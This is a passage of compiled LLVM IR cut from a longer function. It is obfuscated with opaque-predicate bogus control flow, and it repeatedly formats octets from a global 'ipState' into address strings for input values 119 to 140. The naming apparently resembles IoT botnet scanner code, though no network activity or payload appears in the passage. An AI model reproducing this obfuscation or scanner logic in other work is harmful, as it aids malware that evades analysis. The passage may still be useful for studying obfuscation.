  br i1 %2465, label %originalBB310, label %originalBB310alteredBB

originalBB310:                                    ; preds = %originalBB310alteredBB, %2457
  %2466 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2467 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2468 = zext i8 %2467 to i32
  %2469 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2470 = zext i8 %2469 to i32
  %2471 = call i32 (i8*, i8*, ...) @szprintf(i8* %2466, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.155, i32 0, i32 0), i32 %2468, i32 %2470)
  %2472 = load i32, i32* @x.75
  %2473 = load i32, i32* @y.76
  %2474 = sub i32 %2472, 1
  %2475 = mul i32 %2472, %2474
  %2476 = urem i32 %2475, 2
  %2477 = icmp eq i32 %2476, 0
  %2478 = icmp slt i32 %2473, 10
  %2479 = or i1 %2477, %2478
  br i1 %2479, label %originalBBpart2312, label %originalBB310alteredBB

originalBBpart2312:                               ; preds = %originalBB310
  br label %2480

; <label>:2480:                                   ; preds = %originalBBpart2312, %originalBBpart2308
  %2481 = load i32, i32* @x.75
  %2482 = load i32, i32* @y.76
  %2483 = sub i32 %2481, 1
  %2484 = mul i32 %2481, %2483
  %2485 = urem i32 %2484, 2
  %2486 = icmp eq i32 %2485, 0
  %2487 = icmp slt i32 %2482, 10
  %2488 = or i1 %2486, %2487
  br i1 %2488, label %originalBB314, label %originalBB314alteredBB

originalBB314:                                    ; preds = %originalBB314alteredBB, %2480
  %2489 = load i32, i32* %1, align 4
  %2490 = icmp eq i32 %2489, 119
  %2491 = load i32, i32* @x.75
  %2492 = load i32, i32* @y.76
  %2493 = sub i32 %2491, 1
  %2494 = mul i32 %2491, %2493
  %2495 = urem i32 %2494, 2
  %2496 = icmp eq i32 %2495, 0
  %2497 = icmp slt i32 %2492, 10
  %2498 = or i1 %2496, %2497
  br i1 %2498, label %originalBBpart2316, label %originalBB314alteredBB

originalBBpart2316:                               ; preds = %originalBB314
  br i1 %2490, label %2499, label %2522

; <label>:2499:                                   ; preds = %originalBBpart2316
  %2500 = load i32, i32* @x.75
  %2501 = load i32, i32* @y.76
  %2502 = sub i32 %2500, 1
  %2503 = mul i32 %2500, %2502
  %2504 = urem i32 %2503, 2
  %2505 = icmp eq i32 %2504, 0
  %2506 = icmp slt i32 %2501, 10
  %2507 = or i1 %2505, %2506
  br i1 %2507, label %originalBB318, label %originalBB318alteredBB

originalBB318:                                    ; preds = %originalBB318alteredBB, %2499
  %2508 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2509 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2510 = zext i8 %2509 to i32
  %2511 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2512 = zext i8 %2511 to i32
  %2513 = call i32 (i8*, i8*, ...) @szprintf(i8* %2508, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.156, i32 0, i32 0), i32 %2510, i32 %2512)
  %2514 = load i32, i32* @x.75
  %2515 = load i32, i32* @y.76
  %2516 = sub i32 %2514, 1
  %2517 = mul i32 %2514, %2516
  %2518 = urem i32 %2517, 2
  %2519 = icmp eq i32 %2518, 0
  %2520 = icmp slt i32 %2515, 10
  %2521 = or i1 %2519, %2520
  br i1 %2521, label %originalBBpart2320, label %originalBB318alteredBB

originalBBpart2320:                               ; preds = %originalBB318
  br label %2522

; <label>:2522:                                   ; preds = %originalBBpart2320, %originalBBpart2316
  %2523 = load i32, i32* %1, align 4
  %2524 = icmp eq i32 %2523, 120
  br i1 %2524, label %2525, label %2548

; <label>:2525:                                   ; preds = %2522
  %2526 = load i32, i32* @x.75
  %2527 = load i32, i32* @y.76
  %2528 = sub i32 %2526, 1
  %2529 = mul i32 %2526, %2528
  %2530 = urem i32 %2529, 2
  %2531 = icmp eq i32 %2530, 0
  %2532 = icmp slt i32 %2527, 10
  %2533 = or i1 %2531, %2532
  br i1 %2533, label %originalBB322, label %originalBB322alteredBB

originalBB322:                                    ; preds = %originalBB322alteredBB, %2525
  %2534 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2535 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2536 = zext i8 %2535 to i32
  %2537 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2538 = zext i8 %2537 to i32
  %2539 = call i32 (i8*, i8*, ...) @szprintf(i8* %2534, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.157, i32 0, i32 0), i32 %2536, i32 %2538)
  %2540 = load i32, i32* @x.75
  %2541 = load i32, i32* @y.76
  %2542 = sub i32 %2540, 1
  %2543 = mul i32 %2540, %2542
  %2544 = urem i32 %2543, 2
  %2545 = icmp eq i32 %2544, 0
  %2546 = icmp slt i32 %2541, 10
  %2547 = or i1 %2545, %2546
  br i1 %2547, label %originalBBpart2324, label %originalBB322alteredBB

originalBBpart2324:                               ; preds = %originalBB322
  br label %2548

; <label>:2548:                                   ; preds = %originalBBpart2324, %2522
  %2549 = load i32, i32* %1, align 4
  %2550 = icmp eq i32 %2549, 121
  br i1 %2550, label %2551, label %2574

; <label>:2551:                                   ; preds = %2548
  %2552 = load i32, i32* @x.75
  %2553 = load i32, i32* @y.76
  %2554 = sub i32 %2552, 1
  %2555 = mul i32 %2552, %2554
  %2556 = urem i32 %2555, 2
  %2557 = icmp eq i32 %2556, 0
  %2558 = icmp slt i32 %2553, 10
  %2559 = or i1 %2557, %2558
  br i1 %2559, label %originalBB326, label %originalBB326alteredBB

originalBB326:                                    ; preds = %originalBB326alteredBB, %2551
  %2560 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2561 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2562 = zext i8 %2561 to i32
  %2563 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2564 = zext i8 %2563 to i32
  %2565 = call i32 (i8*, i8*, ...) @szprintf(i8* %2560, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.158, i32 0, i32 0), i32 %2562, i32 %2564)
  %2566 = load i32, i32* @x.75
  %2567 = load i32, i32* @y.76
  %2568 = sub i32 %2566, 1
  %2569 = mul i32 %2566, %2568
  %2570 = urem i32 %2569, 2
  %2571 = icmp eq i32 %2570, 0
  %2572 = icmp slt i32 %2567, 10
  %2573 = or i1 %2571, %2572
  br i1 %2573, label %originalBBpart2328, label %originalBB326alteredBB

originalBBpart2328:                               ; preds = %originalBB326
  br label %2574

; <label>:2574:                                   ; preds = %originalBBpart2328, %2548
  %2575 = load i32, i32* @x.75
  %2576 = load i32, i32* @y.76
  %2577 = sub i32 %2575, 1
  %2578 = mul i32 %2575, %2577
  %2579 = urem i32 %2578, 2
  %2580 = icmp eq i32 %2579, 0
  %2581 = icmp slt i32 %2576, 10
  %2582 = or i1 %2580, %2581
  br i1 %2582, label %originalBB330, label %originalBB330alteredBB

originalBB330:                                    ; preds = %originalBB330alteredBB, %2574
  %2583 = load i32, i32* %1, align 4
  %2584 = icmp eq i32 %2583, 122
  %2585 = load i32, i32* @x.75
  %2586 = load i32, i32* @y.76
  %2587 = sub i32 %2585, 1
  %2588 = mul i32 %2585, %2587
  %2589 = urem i32 %2588, 2
  %2590 = icmp eq i32 %2589, 0
  %2591 = icmp slt i32 %2586, 10
  %2592 = or i1 %2590, %2591
  br i1 %2592, label %originalBBpart2332, label %originalBB330alteredBB

originalBBpart2332:                               ; preds = %originalBB330
  br i1 %2584, label %2593, label %2616

; <label>:2593:                                   ; preds = %originalBBpart2332
  %2594 = load i32, i32* @x.75
  %2595 = load i32, i32* @y.76
  %2596 = sub i32 %2594, 1
  %2597 = mul i32 %2594, %2596
  %2598 = urem i32 %2597, 2
  %2599 = icmp eq i32 %2598, 0
  %2600 = icmp slt i32 %2595, 10
  %2601 = or i1 %2599, %2600
  br i1 %2601, label %originalBB334, label %originalBB334alteredBB

originalBB334:                                    ; preds = %originalBB334alteredBB, %2593
  %2602 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2603 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2604 = zext i8 %2603 to i32
  %2605 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2606 = zext i8 %2605 to i32
  %2607 = call i32 (i8*, i8*, ...) @szprintf(i8* %2602, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.159, i32 0, i32 0), i32 %2604, i32 %2606)
  %2608 = load i32, i32* @x.75
  %2609 = load i32, i32* @y.76
  %2610 = sub i32 %2608, 1
  %2611 = mul i32 %2608, %2610
  %2612 = urem i32 %2611, 2
  %2613 = icmp eq i32 %2612, 0
  %2614 = icmp slt i32 %2609, 10
  %2615 = or i1 %2613, %2614
  br i1 %2615, label %originalBBpart2336, label %originalBB334alteredBB

originalBBpart2336:                               ; preds = %originalBB334
  br label %2616

; <label>:2616:                                   ; preds = %originalBBpart2336, %originalBBpart2332
  %2617 = load i32, i32* %1, align 4
  %2618 = icmp eq i32 %2617, 123
  br i1 %2618, label %2619, label %2626

; <label>:2619:                                   ; preds = %2616
  %2620 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2621 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2622 = zext i8 %2621 to i32
  %2623 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2624 = zext i8 %2623 to i32
  %2625 = call i32 (i8*, i8*, ...) @szprintf(i8* %2620, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.160, i32 0, i32 0), i32 %2622, i32 %2624)
  br label %2626

; <label>:2626:                                   ; preds = %2619, %2616
  %2627 = load i32, i32* %1, align 4
  %2628 = icmp eq i32 %2627, 124
  br i1 %2628, label %2629, label %2652

; <label>:2629:                                   ; preds = %2626
  %2630 = load i32, i32* @x.75
  %2631 = load i32, i32* @y.76
  %2632 = sub i32 %2630, 1
  %2633 = mul i32 %2630, %2632
  %2634 = urem i32 %2633, 2
  %2635 = icmp eq i32 %2634, 0
  %2636 = icmp slt i32 %2631, 10
  %2637 = or i1 %2635, %2636
  br i1 %2637, label %originalBB338, label %originalBB338alteredBB

originalBB338:                                    ; preds = %originalBB338alteredBB, %2629
  %2638 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2639 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2640 = zext i8 %2639 to i32
  %2641 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2642 = zext i8 %2641 to i32
  %2643 = call i32 (i8*, i8*, ...) @szprintf(i8* %2638, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.161, i32 0, i32 0), i32 %2640, i32 %2642)
  %2644 = load i32, i32* @x.75
  %2645 = load i32, i32* @y.76
  %2646 = sub i32 %2644, 1
  %2647 = mul i32 %2644, %2646
  %2648 = urem i32 %2647, 2
  %2649 = icmp eq i32 %2648, 0
  %2650 = icmp slt i32 %2645, 10
  %2651 = or i1 %2649, %2650
  br i1 %2651, label %originalBBpart2340, label %originalBB338alteredBB

originalBBpart2340:                               ; preds = %originalBB338
  br label %2652

; <label>:2652:                                   ; preds = %originalBBpart2340, %2626
  %2653 = load i32, i32* %1, align 4
  %2654 = icmp eq i32 %2653, 125
  br i1 %2654, label %2655, label %2662

; <label>:2655:                                   ; preds = %2652
  %2656 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2657 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2658 = zext i8 %2657 to i32
  %2659 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2660 = zext i8 %2659 to i32
  %2661 = call i32 (i8*, i8*, ...) @szprintf(i8* %2656, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.162, i32 0, i32 0), i32 %2658, i32 %2660)
  br label %2662

; <label>:2662:                                   ; preds = %2655, %2652
  %2663 = load i32, i32* %1, align 4
  %2664 = icmp eq i32 %2663, 126
  br i1 %2664, label %2665, label %2688

; <label>:2665:                                   ; preds = %2662
  %2666 = load i32, i32* @x.75
  %2667 = load i32, i32* @y.76
  %2668 = sub i32 %2666, 1
  %2669 = mul i32 %2666, %2668
  %2670 = urem i32 %2669, 2
  %2671 = icmp eq i32 %2670, 0
  %2672 = icmp slt i32 %2667, 10
  %2673 = or i1 %2671, %2672
  br i1 %2673, label %originalBB342, label %originalBB342alteredBB

originalBB342:                                    ; preds = %originalBB342alteredBB, %2665
  %2674 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2675 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2676 = zext i8 %2675 to i32
  %2677 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2678 = zext i8 %2677 to i32
  %2679 = call i32 (i8*, i8*, ...) @szprintf(i8* %2674, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.163, i32 0, i32 0), i32 %2676, i32 %2678)
  %2680 = load i32, i32* @x.75
  %2681 = load i32, i32* @y.76
  %2682 = sub i32 %2680, 1
  %2683 = mul i32 %2680, %2682
  %2684 = urem i32 %2683, 2
  %2685 = icmp eq i32 %2684, 0
  %2686 = icmp slt i32 %2681, 10
  %2687 = or i1 %2685, %2686
  br i1 %2687, label %originalBBpart2344, label %originalBB342alteredBB

originalBBpart2344:                               ; preds = %originalBB342
  br label %2688

; <label>:2688:                                   ; preds = %originalBBpart2344, %2662
  %2689 = load i32, i32* %1, align 4
  %2690 = icmp eq i32 %2689, 127
  br i1 %2690, label %2691, label %2698

; <label>:2691:                                   ; preds = %2688
  %2692 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2693 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2694 = zext i8 %2693 to i32
  %2695 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2696 = zext i8 %2695 to i32
  %2697 = call i32 (i8*, i8*, ...) @szprintf(i8* %2692, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.153, i32 0, i32 0), i32 %2694, i32 %2696)
  br label %2698

; <label>:2698:                                   ; preds = %2691, %2688
  %2699 = load i32, i32* @x.75
  %2700 = load i32, i32* @y.76
  %2701 = sub i32 %2699, 1
  %2702 = mul i32 %2699, %2701
  %2703 = urem i32 %2702, 2
  %2704 = icmp eq i32 %2703, 0
  %2705 = icmp slt i32 %2700, 10
  %2706 = or i1 %2704, %2705
  br i1 %2706, label %originalBB346, label %originalBB346alteredBB

originalBB346:                                    ; preds = %originalBB346alteredBB, %2698
  %2707 = load i32, i32* %1, align 4
  %2708 = icmp eq i32 %2707, 128
  %2709 = load i32, i32* @x.75
  %2710 = load i32, i32* @y.76
  %2711 = sub i32 %2709, 1
  %2712 = mul i32 %2709, %2711
  %2713 = urem i32 %2712, 2
  %2714 = icmp eq i32 %2713, 0
  %2715 = icmp slt i32 %2710, 10
  %2716 = or i1 %2714, %2715
  br i1 %2716, label %originalBBpart2348, label %originalBB346alteredBB

originalBBpart2348:                               ; preds = %originalBB346
  br i1 %2708, label %2717, label %2724

; <label>:2717:                                   ; preds = %originalBBpart2348
  %2718 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2719 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2720 = zext i8 %2719 to i32
  %2721 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2722 = zext i8 %2721 to i32
  %2723 = call i32 (i8*, i8*, ...) @szprintf(i8* %2718, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.164, i32 0, i32 0), i32 %2720, i32 %2722)
  br label %2724

; <label>:2724:                                   ; preds = %2717, %originalBBpart2348
  %2725 = load i32, i32* %1, align 4
  %2726 = icmp eq i32 %2725, 129
  br i1 %2726, label %2727, label %2734

; <label>:2727:                                   ; preds = %2724
  %2728 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2729 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2730 = zext i8 %2729 to i32
  %2731 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2732 = zext i8 %2731 to i32
  %2733 = call i32 (i8*, i8*, ...) @szprintf(i8* %2728, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.165, i32 0, i32 0), i32 %2730, i32 %2732)
  br label %2734

; <label>:2734:                                   ; preds = %2727, %2724
  %2735 = load i32, i32* %1, align 4
  %2736 = icmp eq i32 %2735, 130
  br i1 %2736, label %2737, label %2744

; <label>:2737:                                   ; preds = %2734
  %2738 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2739 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2740 = zext i8 %2739 to i32
  %2741 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2742 = zext i8 %2741 to i32
  %2743 = call i32 (i8*, i8*, ...) @szprintf(i8* %2738, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.159, i32 0, i32 0), i32 %2740, i32 %2742)
  br label %2744

; <label>:2744:                                   ; preds = %2737, %2734
  %2745 = load i32, i32* %1, align 4
  %2746 = icmp eq i32 %2745, 131
  br i1 %2746, label %2747, label %2770

; <label>:2747:                                   ; preds = %2744
  %2748 = load i32, i32* @x.75
  %2749 = load i32, i32* @y.76
  %2750 = sub i32 %2748, 1
  %2751 = mul i32 %2748, %2750
  %2752 = urem i32 %2751, 2
  %2753 = icmp eq i32 %2752, 0
  %2754 = icmp slt i32 %2749, 10
  %2755 = or i1 %2753, %2754
  br i1 %2755, label %originalBB350, label %originalBB350alteredBB

originalBB350:                                    ; preds = %originalBB350alteredBB, %2747
  %2756 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2757 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2758 = zext i8 %2757 to i32
  %2759 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2760 = zext i8 %2759 to i32
  %2761 = call i32 (i8*, i8*, ...) @szprintf(i8* %2756, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.166, i32 0, i32 0), i32 %2758, i32 %2760)
  %2762 = load i32, i32* @x.75
  %2763 = load i32, i32* @y.76
  %2764 = sub i32 %2762, 1
  %2765 = mul i32 %2762, %2764
  %2766 = urem i32 %2765, 2
  %2767 = icmp eq i32 %2766, 0
  %2768 = icmp slt i32 %2763, 10
  %2769 = or i1 %2767, %2768
  br i1 %2769, label %originalBBpart2352, label %originalBB350alteredBB

originalBBpart2352:                               ; preds = %originalBB350
  br label %2770

; <label>:2770:                                   ; preds = %originalBBpart2352, %2744
  %2771 = load i32, i32* %1, align 4
  %2772 = icmp eq i32 %2771, 132
  br i1 %2772, label %2773, label %2796

; <label>:2773:                                   ; preds = %2770
  %2774 = load i32, i32* @x.75
  %2775 = load i32, i32* @y.76
  %2776 = sub i32 %2774, 1
  %2777 = mul i32 %2774, %2776
  %2778 = urem i32 %2777, 2
  %2779 = icmp eq i32 %2778, 0
  %2780 = icmp slt i32 %2775, 10
  %2781 = or i1 %2779, %2780
  br i1 %2781, label %originalBB354, label %originalBB354alteredBB

originalBB354:                                    ; preds = %originalBB354alteredBB, %2773
  %2782 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2783 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2784 = zext i8 %2783 to i32
  %2785 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2786 = zext i8 %2785 to i32
  %2787 = call i32 (i8*, i8*, ...) @szprintf(i8* %2782, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.167, i32 0, i32 0), i32 %2784, i32 %2786)
  %2788 = load i32, i32* @x.75
  %2789 = load i32, i32* @y.76
  %2790 = sub i32 %2788, 1
  %2791 = mul i32 %2788, %2790
  %2792 = urem i32 %2791, 2
  %2793 = icmp eq i32 %2792, 0
  %2794 = icmp slt i32 %2789, 10
  %2795 = or i1 %2793, %2794
  br i1 %2795, label %originalBBpart2356, label %originalBB354alteredBB

originalBBpart2356:                               ; preds = %originalBB354
  br label %2796

; <label>:2796:                                   ; preds = %originalBBpart2356, %2770
  %2797 = load i32, i32* %1, align 4
  %2798 = icmp eq i32 %2797, 133
  br i1 %2798, label %2799, label %2806

; <label>:2799:                                   ; preds = %2796
  %2800 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2801 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2802 = zext i8 %2801 to i32
  %2803 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2804 = zext i8 %2803 to i32
  %2805 = call i32 (i8*, i8*, ...) @szprintf(i8* %2800, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.168, i32 0, i32 0), i32 %2802, i32 %2804)
  br label %2806

; <label>:2806:                                   ; preds = %2799, %2796
  %2807 = load i32, i32* %1, align 4
  %2808 = icmp eq i32 %2807, 134
  br i1 %2808, label %2809, label %2816

; <label>:2809:                                   ; preds = %2806
  %2810 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2811 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2812 = zext i8 %2811 to i32
  %2813 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2814 = zext i8 %2813 to i32
  %2815 = call i32 (i8*, i8*, ...) @szprintf(i8* %2810, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.169, i32 0, i32 0), i32 %2812, i32 %2814)
  br label %2816

; <label>:2816:                                   ; preds = %2809, %2806
  %2817 = load i32, i32* @x.75
  %2818 = load i32, i32* @y.76
  %2819 = sub i32 %2817, 1
  %2820 = mul i32 %2817, %2819
  %2821 = urem i32 %2820, 2
  %2822 = icmp eq i32 %2821, 0
  %2823 = icmp slt i32 %2818, 10
  %2824 = or i1 %2822, %2823
  br i1 %2824, label %originalBB358, label %originalBB358alteredBB

originalBB358:                                    ; preds = %originalBB358alteredBB, %2816
  %2825 = load i32, i32* %1, align 4
  %2826 = icmp eq i32 %2825, 135
  %2827 = load i32, i32* @x.75
  %2828 = load i32, i32* @y.76
  %2829 = sub i32 %2827, 1
  %2830 = mul i32 %2827, %2829
  %2831 = urem i32 %2830, 2
  %2832 = icmp eq i32 %2831, 0
  %2833 = icmp slt i32 %2828, 10
  %2834 = or i1 %2832, %2833
  br i1 %2834, label %originalBBpart2360, label %originalBB358alteredBB

originalBBpart2360:                               ; preds = %originalBB358
  br i1 %2826, label %2835, label %2842

; <label>:2835:                                   ; preds = %originalBBpart2360
  %2836 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2837 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2838 = zext i8 %2837 to i32
  %2839 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2840 = zext i8 %2839 to i32
  %2841 = call i32 (i8*, i8*, ...) @szprintf(i8* %2836, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.170, i32 0, i32 0), i32 %2838, i32 %2840)
  br label %2842

; <label>:2842:                                   ; preds = %2835, %originalBBpart2360
  %2843 = load i32, i32* %1, align 4
  %2844 = icmp eq i32 %2843, 136
  br i1 %2844, label %2845, label %2868

; <label>:2845:                                   ; preds = %2842
  %2846 = load i32, i32* @x.75
  %2847 = load i32, i32* @y.76
  %2848 = sub i32 %2846, 1
  %2849 = mul i32 %2846, %2848
  %2850 = urem i32 %2849, 2
  %2851 = icmp eq i32 %2850, 0
  %2852 = icmp slt i32 %2847, 10
  %2853 = or i1 %2851, %2852
  br i1 %2853, label %originalBB362, label %originalBB362alteredBB

originalBB362:                                    ; preds = %originalBB362alteredBB, %2845
  %2854 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2855 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2856 = zext i8 %2855 to i32
  %2857 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2858 = zext i8 %2857 to i32
  %2859 = call i32 (i8*, i8*, ...) @szprintf(i8* %2854, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.171, i32 0, i32 0), i32 %2856, i32 %2858)
  %2860 = load i32, i32* @x.75
  %2861 = load i32, i32* @y.76
  %2862 = sub i32 %2860, 1
  %2863 = mul i32 %2860, %2862
  %2864 = urem i32 %2863, 2
  %2865 = icmp eq i32 %2864, 0
  %2866 = icmp slt i32 %2861, 10
  %2867 = or i1 %2865, %2866
  br i1 %2867, label %originalBBpart2364, label %originalBB362alteredBB

originalBBpart2364:                               ; preds = %originalBB362
  br label %2868

; <label>:2868:                                   ; preds = %originalBBpart2364, %2842
  %2869 = load i32, i32* %1, align 4
  %2870 = icmp eq i32 %2869, 137
  br i1 %2870, label %2871, label %2878

; <label>:2871:                                   ; preds = %2868
  %2872 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2873 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2874 = zext i8 %2873 to i32
  %2875 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2876 = zext i8 %2875 to i32
  %2877 = call i32 (i8*, i8*, ...) @szprintf(i8* %2872, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.172, i32 0, i32 0), i32 %2874, i32 %2876)
  br label %2878

; <label>:2878:                                   ; preds = %2871, %2868
  %2879 = load i32, i32* %1, align 4
  %2880 = icmp eq i32 %2879, 138
  br i1 %2880, label %2881, label %2904

; <label>:2881:                                   ; preds = %2878
  %2882 = load i32, i32* @x.75
  %2883 = load i32, i32* @y.76
  %2884 = sub i32 %2882, 1
  %2885 = mul i32 %2882, %2884
  %2886 = urem i32 %2885, 2
  %2887 = icmp eq i32 %2886, 0
  %2888 = icmp slt i32 %2883, 10
  %2889 = or i1 %2887, %2888
  br i1 %2889, label %originalBB366, label %originalBB366alteredBB

originalBB366:                                    ; preds = %originalBB366alteredBB, %2881
  %2890 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2891 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2892 = zext i8 %2891 to i32
  %2893 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2894 = zext i8 %2893 to i32
  %2895 = call i32 (i8*, i8*, ...) @szprintf(i8* %2890, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.173, i32 0, i32 0), i32 %2892, i32 %2894)
  %2896 = load i32, i32* @x.75
  %2897 = load i32, i32* @y.76
  %2898 = sub i32 %2896, 1
  %2899 = mul i32 %2896, %2898
  %2900 = urem i32 %2899, 2
  %2901 = icmp eq i32 %2900, 0
  %2902 = icmp slt i32 %2897, 10
  %2903 = or i1 %2901, %2902
  br i1 %2903, label %originalBBpart2368, label %originalBB366alteredBB

originalBBpart2368:                               ; preds = %originalBB366
  br label %2904

; <label>:2904:                                   ; preds = %originalBBpart2368, %2878
  %2905 = load i32, i32* %1, align 4
  %2906 = icmp eq i32 %2905, 139
  br i1 %2906, label %2907, label %2914

; <label>:2907:                                   ; preds = %2904
  %2908 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2909 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2910 = zext i8 %2909 to i32
  %2911 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2912 = zext i8 %2911 to i32
  %2913 = call i32 (i8*, i8*, ...) @szprintf(i8* %2908, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.174, i32 0, i32 0), i32 %2910, i32 %2912)
  br label %2914

; <label>:2914:                                   ; preds = %2907, %2904
  %2915 = load i32, i32* %1, align 4
  %2916 = icmp eq i32 %2915, 140
